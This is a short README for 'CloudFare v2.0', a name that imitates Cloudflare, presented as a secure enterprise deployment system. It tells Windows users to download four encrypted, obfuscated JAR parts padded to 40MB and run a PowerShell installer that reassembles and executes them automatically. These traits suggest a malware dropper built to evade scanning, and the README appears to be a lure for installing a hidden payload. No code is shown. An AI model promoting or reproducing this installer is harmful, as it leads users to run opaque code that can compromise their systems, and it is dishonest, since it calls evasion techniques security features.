# CloudFare v2.0 - Secure Deployment System

## Overview
CloudFare v2.0 is an enterprise-grade deployment system featuring:
- Java 21 LTS compilation
- Advanced JAR obfuscation
- 40MB padding and splitting into 4 parts
- Ultra-robust PowerShell installation framework
- Comprehensive error handling and retry logic

## Features
- **Security**: Encrypted and obfuscated JAR components
- **Reliability**: 14-type error handling with automatic retry
- **Modularity**: Split deployment (4 JAR parts)
- **Flexibility**: PowerShell-based installation framework
- **Automation**: GitHub-integrated deployment pipeline

## Quick Start
1. Download all 4 JAR parts from the repository
2. Run `Install_v2_Robust.ps1` from PowerShell
3. System will automatically reassemble and execute

## Files
- `EncrypedPure.part1.jar` - JAR Part 1/4
- `EncrypedPure.part2.jar` - JAR Part 2/4
- `EncrypedPure.part3.jar` - JAR Part 3/4
- `EncrypedPure.part4.jar` - JAR Part 4/4
- `Install_v2_Robust.ps1` - Main installation script
- `Verify_URLs.ps1` - URL verification utility
- `ErrorHandler.ps1` - Error handling framework
- `Pre_Deployment_Check.ps1` - Pre-flight validation

## Requirements
- Windows 10/11
- PowerShell 5.1+
- Java 21 (automatic installation)
- Internet connectivity
